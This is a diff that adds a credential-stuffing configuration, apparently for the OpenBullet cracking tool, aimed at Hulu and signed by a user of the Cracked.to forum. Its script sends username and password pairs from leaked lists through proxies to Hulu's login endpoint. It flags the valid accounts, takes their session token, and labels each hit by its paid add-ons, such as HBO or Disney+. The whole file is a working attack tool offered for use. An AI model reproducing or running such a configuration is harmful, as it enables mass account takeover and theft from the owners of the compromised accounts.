@@ -1,0 +1,105 @@
+[SETTINGS]
+{
+  "Name": "HULU",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-12T22:11:35.3547495+01:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.0.0",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" 
+  CONTENT "affiliate_name=crackedto&friendly_name=crackedto&product_name=crackedto&serial_number=crackedto&user_email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid" 
+
+#USER_TOKEN PARSE "<SOURCE>" JSON "user_token" -> VAR "user_token" 
+
+#SUBSCRIPTION REQUEST GET "https://home.hulu.com/v1/users/self" 
+  
+  HEADER "Authorization: Bearer <user_token>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "package_ids\":[]" 
+
+#PACKAGE_IDS PARSE "<SOURCE>" JSON "package_ids" EncodeOutput=TRUE -> VAR "package_ids" 
+
+#SUBSCRIPTION FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "%22" VALUE "" 
+  KEY "%5B" VALUE "" 
+  KEY "%5D" VALUE "" 
+  KEY "%0D%0A%20%20" VALUE "" 
+  KEY "%0D%0A" VALUE "" 
+  KEY "14" VALUE "No Commercials" 
+  KEY "15" VALUE "Showtime" 
+  KEY "16" VALUE "Live TV" 
+  KEY "17" VALUE "HBO" 
+  KEY "18" VALUE "Cinemax" 
+  KEY "19" VALUE "Starz" 
+  KEY "21" VALUE "Entertainment Add-On" 
+  KEY "23" VALUE "Espanol Add-On" 
+  KEY "25" VALUE "Disney+" 
+  KEY "26" VALUE "ESPN" 
+  KEY "%2C" VALUE ", " 
+  KEY "1%22%2C" VALUE "" 
+  KEY "2%22%2C" VALUE "" 
+  "<package_ids>" -> CAP "SUBSCRIPTION" 
+
+IF "<SUBSCRIPTION>" EqualTo "2"
+
+#SUBSCRIPTION FUNCTION Constant "Hulu" -> CAP "SUBSCRIPTION" 
+
+ENDIF
